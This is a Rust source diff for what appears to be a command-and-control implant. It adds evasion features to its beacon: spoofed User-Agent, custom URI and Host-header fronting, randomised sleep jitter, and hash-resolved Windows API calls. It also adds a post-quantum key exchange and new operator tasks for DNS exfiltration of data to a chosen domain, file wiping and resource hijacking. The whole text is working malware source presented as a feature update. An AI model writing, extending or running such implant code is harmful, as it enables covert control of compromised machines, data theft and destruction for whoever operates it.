@@ -24,10 +24,14 @@ pub struct PatchableConfig {
     magic: [u8; 19],
     pub server_addr: [u8; 64],
     pub sleep_interval: u64,
-    pub kill_date: u64,
+    pub jitter: u8,
     pub working_hours_start: u8,
     pub working_hours_end: u8,
-    pub padding: [u8; 6],
+    pub kill_date: u64,
+    pub user_agent: [u8; 64],
+    pub uri: [u8; 64],
+    pub host_header: [u8; 64],
+    pub padding: [u8; 32],
 }
 
 // Place in .data section to be writable/patchable
@@ -36,10 +40,14 @@ pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
     magic: CONFIG_MAGIC,
     server_addr: [0u8; 64], // Zeros to be patched
     sleep_interval: 5000,
-    kill_date: 0,
+    jitter: 10,
     working_hours_start: 0,
     working_hours_end: 0,
-    padding: [0; 6],
+    kill_date: 0,
+    user_agent: [0u8; 64],
+    uri: [0u8; 64],
+    host_header: [0u8; 64],
+    padding: [0; 32],
 };
 
 #[derive(Debug, Serialize, Deserialize, Clone, Copy)]
@@ -52,8 +60,12 @@ pub struct C2Config {
     pub transport: TransportType,
     pub server_addr: &'static str,
     pub sleep_interval: u64,
+    pub jitter: u8,
     pub kill_date: u64,
     pub working_hours: (u8, u8),
+    pub user_agent: &'static str,
+    pub uri: &'static str,
+    pub host_header: &'static str,
 }
 
 impl C2Config {
@@ -69,15 +81,46 @@ impl C2Config {
                 "127.0.0.1"
             };
 
+            let ua_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.user_agent);
+            let ua_slice = &*ua_ptr;
+            let ua_len = ua_slice.iter().position(|&c| c == 0).unwrap_or(64);
+            let ua_str = if ua_len > 0 {
+                core::str::from_utf8_unchecked(&ua_slice[..ua_len])
+            } else {
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            };
+
+            let uri_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.uri);
+            let uri_slice = &*uri_ptr;
+            let uri_len = uri_slice.iter().position(|&c| c == 0).unwrap_or(64);
+            let uri_str = if uri_len > 0 {
+                core::str::from_utf8_unchecked(&uri_slice[..uri_len])
+            } else {
+                "/api/v1/beacon"
+            };
+
+            let host_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.host_header);
+            let host_slice = &*host_ptr;
+            let host_len = host_slice.iter().position(|&c| c == 0).unwrap_or(64);
+            let host_str = if host_len > 0 {
+                core::str::from_utf8_unchecked(&host_slice[..host_len])
+            } else {
+                ""
+            };
+
             Self {
                 transport: TransportType::Http,
                 server_addr: addr_str,
                 sleep_interval: core::ptr::addr_of!(GLOBAL_CONFIG.sleep_interval).read(),
+                jitter: core::ptr::addr_of!(GLOBAL_CONFIG.jitter).read(),
                 kill_date: core::ptr::addr_of!(GLOBAL_CONFIG.kill_date).read(),
                 working_hours: (
                     core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_start).read(),
                     core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_end).read(),
                 ),
+                user_agent: ua_str,
+                uri: uri_str,
+                host_header: host_str,
             }
         }
     }
@@ -92,12 +135,21 @@ pub trait Transport {
 pub struct HttpTransport {
     host: &'static str,
     port: u16,
+    user_agent: &'static str,
+    uri: &'static str,
+    host_header: &'static str,
 }
 
 #[cfg(not(target_os = "windows"))]
 impl HttpTransport {
-    pub fn new(host: &'static str, port: u16) -> Self {
-        Self { host, port }
+    pub fn new(config: &C2Config, port: u16) -> Self {
+        Self { 
+            host: config.server_addr, 
+            port,
+            user_agent: config.user_agent,
+            uri: config.uri,
+            host_header: config.host_header,
+        }
     }
 }
 
@@ -131,13 +183,18 @@ impl Transport for HttpTransport {
                 return Err(());
             }
 
+            let host_val = if !self.host_header.is_empty() { self.host_header } else { self.host };
+
             let req = format!(
-                "POST /api/v1/beacon HTTP/1.1\r\n\
+                "POST {} HTTP/1.1\r\n\
                  Host: {}\r\n\
+                 User-Agent: {}\r\n\
                  Content-Type: application/octet-stream\r\n\
                  Content-Length: {}\r\n\
                  Connection: close\r\n\r\n",
-                self.host,
+                self.uri,
+                host_val,
+                self.user_agent,
                 data.len()
             );
 
@@ -177,12 +234,21 @@ impl Transport for HttpTransport {
 pub struct HttpTransport {
     host: &'static str,
     port: u16,
+    user_agent: &'static str,
+    uri: &'static str,
+    host_header: &'static str,
 }
 
 #[cfg(target_os = "windows")]
 impl HttpTransport {
-    pub fn new(host: &'static str, port: u16) -> Self {
-        Self { host, port }
+    pub fn new(config: &C2Config, port: u16) -> Self {
+        Self { 
+            host: config.server_addr, 
+            port,
+            user_agent: config.user_agent,
+            uri: config.uri,
+            host_header: config.host_header,
+        }
     }
 }
 
@@ -205,7 +271,9 @@ impl Transport for HttpTransport {
             let internet_read: InternetReadFile = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetReadFile")));
             let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetCloseHandle")));
 
-            let h_inet = internet_open(b"Spectre\0".as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
+            let mut ua_c = Vec::from(self.user_agent.as_bytes());
+            ua_c.push(0);
+            let h_inet = internet_open(ua_c.as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
             if h_inet.is_null() { return Err(()); }
 
             let mut host_c = Vec::from(self.host.as_bytes());
@@ -216,14 +284,30 @@ impl Transport for HttpTransport {
                 return Err(()); 
             }
 
-            let h_req = http_open(h_conn, b"POST\0".as_ptr(), b"/api/v1/beacon\0".as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
+            let mut uri_c = Vec::from(self.uri.as_bytes());
+            uri_c.push(0);
+            let h_req = http_open(h_conn, b"POST\0".as_ptr(), uri_c.as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
             if h_req.is_null() {
                 internet_close(h_conn);
                 internet_close(h_inet);
                 return Err(());
             }
 
-            if http_send(h_req, core::ptr::null(), 0, data.as_ptr() as *const c_void, data.len() as u32) == 0 {
+            let mut headers = alloc::string::String::new();
+            if !self.host_header.is_empty() {
+                headers = format!("Host: {}\r\n", self.host_header);
+            }
+            let headers_c = if !headers.is_empty() {
+                let mut v = Vec::from(headers.as_bytes());
+                v.push(0);
+                v
+            } else {
+                Vec::new()
+            };
+
+            let headers_ptr = if !headers_c.is_empty() { headers_c.as_ptr() } else { core::ptr::null() };
+
+            if http_send(h_req, headers_ptr, headers_c.len() as u32, data.as_ptr() as *const c_void, data.len() as u32) == 0 {
                 internet_close(h_req);
                 internet_close(h_conn);
                 internet_close(h_inet);
@@ -454,6 +538,33 @@ fn perform_handshake(transport: &mut dyn Transport) -> Result<NoiseTransport, ()
     noise.into_transport(None, peer_ratchet_pub).map_err(|_| ())
 }
 
+fn perform_pq_exchange(session: &mut NoiseTransport, transport: &mut dyn Transport) -> Result<(), ()> {
+    let mut rng = wraith_crypto::random::SecureRng::new();
+    let (ek, dk) = wraith_crypto::pq::generate_keypair(&mut rng);
+
+    let ek_bytes = wraith_crypto::pq::public_key_to_vec(&ek);
+
+    let frame = WraithFrame::new(packet::FRAME_PQ_KEX, ek_bytes);
+    let msg = session.write_message(&frame.serialize()).map_err(|_| ())?;
+
+    // Server should respond with Ciphertext
+    let resp = transport.request(&msg)?;
+    let payload = session.read_message(&resp).map_err(|_| ())?;
+
+    let resp_frame = WraithFrame::deserialize(&payload).ok_or(())?;
+    if resp_frame.frame_type != packet::FRAME_PQ_KEX {
+        return Err(());
+    }
+
+    // Parse Ciphertext
+    let ct = wraith_crypto::pq::ciphertext_from_bytes(resp_frame.payload.as_slice()).map_err(|_| ())?;
+
+    let ss = wraith_crypto::pq::decapsulate(&dk, &ct);
+    
+    session.mix_key(&ss);
+    Ok(())
+}
+
 fn get_current_unix_time() -> u64 {
     #[cfg(target_os = "windows")]
     unsafe {
@@ -499,7 +610,7 @@ fn is_within_working_hours(start: u8, end: u8) -> bool {
 pub fn run_beacon_loop(_initial_config: C2Config) -> !
 {
     let config = C2Config::get_global();
-    let mut http_transport = HttpTransport::new(config.server_addr, 8080);
+    let mut http_transport = HttpTransport::new(&config, 8080);
     let mut udp_transport = UdpTransport::new(config.server_addr, 9999);
     
     let mut use_udp = matches!(config.transport, TransportType::Udp);
@@ -525,9 +636,15 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
             
             match perform_handshake(transport) {
-                Ok(s) => {
-                    session = s;
-                    break;
+                Ok(mut s) => {
+                    // Upgrade to Post-Quantum Hybrid
+                    if perform_pq_exchange(&mut s, transport).is_ok() {
+                        session = s;
+                        break;
+                    }
+                    // PQ Exchange failed, retry handshake
+                    use_udp = !use_udp;
+                    crate::utils::obfuscation::sleep(config.sleep_interval);
                 },
                 Err(_) => {
                     // Failover
@@ -632,7 +749,18 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             }
 
             last_rekey += 1;
-            crate::utils::obfuscation::sleep(config.sleep_interval);
+            
+            // Jittered Sleep
+            let jitter_amt = if config.jitter > 0 {
+                let mut rand_buf = [0u8; 1];
+                crate::utils::entropy::get_random_bytes(&mut rand_buf);
+                let rand_percent = (rand_buf[0] as u64 % (config.jitter as u64 * 2)) as i64 - config.jitter as i64;
+                config.sleep_interval as i64 * rand_percent / 100
+            } else {
+                0
+            };
+            let sleep_ms = (config.sleep_interval as i64 + jitter_amt).max(100) as u64;
+            crate::utils::obfuscation::sleep(sleep_ms);
         }
     }
 }
@@ -841,6 +969,31 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                     }
                     result = Some(SensitiveData::new(&res_vec));
                     res_vec.zeroize();
+                },
+                "compress" => {
+                    let data = hex_decode(&task.payload);
+                    let compressed = crate::modules::compression::Compression.compress(&data);
+                    result = Some(SensitiveData::new(&compressed));
+                },
+                "exfil_dns" => {
+                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
+                    if parts.len() == 2 {
+                        let data = hex_decode(parts[0]);
+                        let domain = parts[1];
+                        let res = crate::modules::exfiltration::Exfiltration.exfiltrate_dns(&data, domain);
+                        let msg = if res.is_ok() { b"Exfiltration started" as &[u8] } else { b"Exfiltration failed" as &[u8] };
+                        result = Some(SensitiveData::new(msg));
+                    }
+                },
+                "wipe" => {
+                    let res = crate::modules::impact::Impact.wipe_file(&task.payload);
+                    let msg = if res.is_ok() { b"File wiped" as &[u8] } else { b"Wipe failed" as &[u8] };
+                    result = Some(SensitiveData::new(msg));
+                },
+                "hijack" => {
+                    let duration = task.payload.parse::<u32>().unwrap_or(1000);
+                    crate::modules::impact::Impact.hijack_resources(duration);
+                    result = Some(SensitiveData::new(b"Resource hijacking simulation complete"));
                 },
                 _ => {}
             }
